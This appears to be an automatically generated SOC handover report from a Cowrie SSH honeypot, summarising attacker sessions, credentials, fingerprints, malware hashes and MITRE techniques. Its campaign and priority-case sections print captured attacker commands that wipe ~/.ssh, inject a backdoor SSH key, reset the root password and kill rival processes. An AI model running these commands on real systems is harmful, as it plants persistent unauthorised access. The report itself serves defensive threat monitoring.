# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-29 |
| **Generated At** | 2026-04-29T06:27:58Z |
| **Shift Time** | 06:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **116** |
| Confirmed Threats | **96** |
| False Positives Filtered | **20** (17.2%) |
| Unique Attacker IPs | **19** |
| Countries of Origin | **10** |
| High Severity Cases | **2** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **114** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 3 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **11** |
| Unique Credential Pairs | **11** |
| Unique Usernames | **7** |
| Unique Passwords | **11** |
| Successful Auth Pairs | **2** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 4 |
| `root` | 2 |
| `webmaster` | 1 |
| `minecraft` | 1 |
| `user` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `------fuck------` | 1 |
| `ubuntu1` | 1 |
| `1234rfv` | 1 |
| `admin` | 1 |
| `q@123456` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `------fuck------` | 1 |
| `ubuntu` | `ubuntu1` | 1 |
| `ubuntu` | `1234rfv` | 1 |
| `webmaster` | `admin` | 1 |
| `ubuntu` | `q@123456` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `------fuck------` | `180.100.214.90` | 2026-04-29T03:57:30 |
| `root` | `admin10086` | `124.236.76.72` | 2026-04-29T04:44:07 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **116** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 64 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 34 | 1 |
| `03a80b21afa8...` | Modern SSH client | 11 | 1 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |
| `e57221504a70...` | Modern SSH client | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 34 | 1 | libssh-based |
| `95420f9d932d...` | libssh | 17 | 2 | — |
| `03a80b21afa8...` | libssh | 11 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `e57221504a70...` | libssh | 1 | 1 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:dSiq1yMtTkhg"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `124.236.76.72`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **19** |
| Unique ASNs | **19** |
| High-Risk ASNs | **8** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | HIGH |
| `AS18209` | Atria Convergence Technologies Ltd., | 1 | LOW |
| `AS138423` | CMPak Limited | 1 | HIGH |
| `AS56044` | China Mobile communications corporation | 1 | HIGH |
| `AS4621` | UNINET-TH | 1 | HIGH |
| `AS55990` | Huawei Cloud Service data center | 1 | HIGH |
| `AS216472` | High Speed For Internet Services L.L.C | 1 | LOW |
| `AS38264` | National WiMAX/IMS environment | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (2)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-040f57beb5a4

| Field | Detail |
|---|---|
| **Source IP** | `180.100.214[.]90` |
| **First Seen** | 2026-04-29 03:55 |
| **Last Seen** | 2026-04-29 03:57 |
| **Session Duration** | 106s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 03:55:47` | `cowrie.session.connect` |
| `2026-04-29 03:55:47` | `cowrie.client.version` |
| `2026-04-29 03:55:47` | `cowrie.client.kex` |
| `2026-04-29 03:57:30` | `cowrie.login.success` |
| `2026-04-29 03:57:33` | `cowrie.session.params` |
| `2026-04-29 03:57:33` | `cowrie.command.input` |
| `2026-04-29 03:57:34` | `cowrie.log.closed` |
| `2026-04-29 03:57:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.100.214[.]90` to AbuseIPDB if not already reported
- [ ] Block `180.100.214[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c5496baf95d

| Field | Detail |
|---|---|
| **Source IP** | `124.236.76[.]72` |
| **First Seen** | 2026-04-29 04:44 |
| **Last Seen** | 2026-04-29 04:44 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:dSiq1yMtTkhg"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 04:44:07` | `cowrie.session.connect` |
| `2026-04-29 04:44:07` | `cowrie.client.version` |
| `2026-04-29 04:44:07` | `cowrie.client.kex` |
| `2026-04-29 04:44:07` | `cowrie.login.success` |
| `2026-04-29 04:44:08` | `cowrie.session.params` |
| `2026-04-29 04:44:08` | `cowrie.command.input` |
| `2026-04-29 04:44:08` | `cowrie.command.failed` |
| `2026-04-29 04:44:08` | `cowrie.log.closed` |
| `2026-04-29 04:44:08` | `cowrie.session.params` |
| `2026-04-29 04:44:08` | `cowrie.command.input` |
| `2026-04-29 04:44:09` | `cowrie.session.file_download` |
| `2026-04-29 04:44:09` | `cowrie.log.closed` |
| `2026-04-29 04:44:21` | `cowrie.session.params` |
| `2026-04-29 04:44:21` | `cowrie.command.input` |
| `2026-04-29 04:44:21` | `cowrie.log.closed` |
| `2026-04-29 04:44:21` | `cowrie.session.params` |
| `2026-04-29 04:44:21` | `cowrie.command.input` |
| `2026-04-29 04:44:21` | `cowrie.log.closed` |
| `2026-04-29 04:44:22` | `cowrie.session.params` |
| `2026-04-29 04:44:22` | `cowrie.command.input` |
| `2026-04-29 04:44:22` | `cowrie.session.file_download` |
| `2026-04-29 04:44:22` | `cowrie.log.closed` |
| `2026-04-29 04:44:22` | `cowrie.session.params` |
| `2026-04-29 04:44:22` | `cowrie.command.input` |
| `2026-04-29 04:44:22` | `cowrie.log.closed` |
| `2026-04-29 04:44:23` | `cowrie.session.params` |
| `2026-04-29 04:44:23` | `cowrie.command.input` |
| `2026-04-29 04:44:23` | `cowrie.log.closed` |
| `2026-04-29 04:44:23` | `cowrie.session.params` |
| `2026-04-29 04:44:23` | `cowrie.command.input` |
| `2026-04-29 04:44:23` | `cowrie.command.input` |
| `2026-04-29 04:44:23` | `cowrie.log.closed` |
| `2026-04-29 04:44:24` | `cowrie.session.params` |
| `2026-04-29 04:44:24` | `cowrie.command.input` |
| `2026-04-29 04:44:24` | `cowrie.log.closed` |
| `2026-04-29 04:44:24` | `cowrie.session.params` |
| `2026-04-29 04:44:24` | `cowrie.command.input` |
| `2026-04-29 04:44:24` | `cowrie.log.closed` |
| `2026-04-29 04:44:25` | `cowrie.session.params` |
| `2026-04-29 04:44:25` | `cowrie.command.input` |
| `2026-04-29 04:44:25` | `cowrie.log.closed` |
| `2026-04-29 04:44:25` | `cowrie.session.params` |
| `2026-04-29 04:44:25` | `cowrie.command.input` |
| `2026-04-29 04:44:25` | `cowrie.log.closed` |
| `2026-04-29 04:44:26` | `cowrie.session.params` |
| `2026-04-29 04:44:26` | `cowrie.command.input` |
| `2026-04-29 04:44:26` | `cowrie.log.closed` |
| `2026-04-29 04:44:26` | `cowrie.session.params` |
| `2026-04-29 04:44:26` | `cowrie.command.input` |
| `2026-04-29 04:44:26` | `cowrie.log.closed` |
| `2026-04-29 04:44:27` | `cowrie.session.params` |
| `2026-04-29 04:44:27` | `cowrie.command.input` |
| `2026-04-29 04:44:27` | `cowrie.log.closed` |
| `2026-04-29 04:44:27` | `cowrie.session.params` |
| `2026-04-29 04:44:27` | `cowrie.command.input` |
| `2026-04-29 04:44:27` | `cowrie.log.closed` |
| `2026-04-29 04:44:28` | `cowrie.session.params` |
| `2026-04-29 04:44:28` | `cowrie.command.input` |
| `2026-04-29 04:44:28` | `cowrie.log.closed` |
| `2026-04-29 04:44:28` | `cowrie.session.params` |
| `2026-04-29 04:44:28` | `cowrie.command.input` |
| `2026-04-29 04:44:28` | `cowrie.log.closed` |
| `2026-04-29 04:44:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.236.76[.]72` to AbuseIPDB if not already reported
- [ ] Block `124.236.76[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `124.236.76[.]72` | **33** | 2026-04-29 04:25 | 2026-04-29 04:52 | 54m | 6 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.76.128[.]183` | **28** | 2026-04-29 04:16 | 2026-04-29 04:38 | 34m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.38[.]35` | **25** | 2026-04-29 04:15 | 2026-04-29 04:20 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `110.37.87[.]13` | **3** | 2026-04-29 04:14 | 2026-04-29 04:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.42.38[.]182` | 1 | 2026-04-29 04:24 | 2026-04-29 04:24 | 1s | 0 | `T1592` | 🟢 LOW |
| `113.45.219[.]17` | 1 | 2026-04-29 04:08 | 2026-04-29 04:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.100.214[.]90` | 1 | 2026-04-29 03:55 | 2026-04-29 03:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `203.159.249[.]80` | 1 | 2026-04-29 04:31 | 2026-04-29 04:31 | 13s | 0 | `T1592` | 🟢 LOW |
| `36.134.69[.]15` | 1 | 2026-04-29 04:15 | 2026-04-29 04:17 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (24 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 34/100 | 🟢 LOW | **11/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `113.45.219[.]17` | CN | Huawei Public Cloud Service (Huawei Software Technologies Ltd.Co) | **100** ⚠️ | 0 |
| `101.42.38[.]182` | CN | Tencent Cloud Computing (Beijing) Co., Ltd | **100** ⚠️ | 3 |
| `180.100.214[.]90` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 6 |
| `124.236.76[.]72` | CN | CHINANET hebei province network | **100** ⚠️ | 32 |
| `223.123.38[.]35` | PK | CMPak Limited | **100** ⚠️ | 43 |
| `36.134.69[.]15` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `180.76.128[.]183` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 13 |
| `203.159.249[.]80` | TH | Office of Info.Tech. Admin. for Educational Development | **100** ⚠️ | 0 |
| `110.37.87[.]13` | PK | National Wimax/IMS environment | **80** ⚠️ | 12 |
| `186.48.181[.]4` | UY | Administracion Nacional de Telecomunicaciones | **79** | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 66 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 9 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 2 |
| [T1057](https://attack.mitre.org/techniques/T1057) | 1 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 1 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 12 below threshold 25 | 4 |
| AbuseIPDB score 16 below threshold 25 | 7 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 116 cases |
| Tool 34  | Credential Extractor        | ✅ 11 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 19 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (17.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 19 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 24 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 2 priority case(s) shown individually · 9 recon entry/entries in table (4 group(s) consolidating 89 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-29T06:27:58Z_
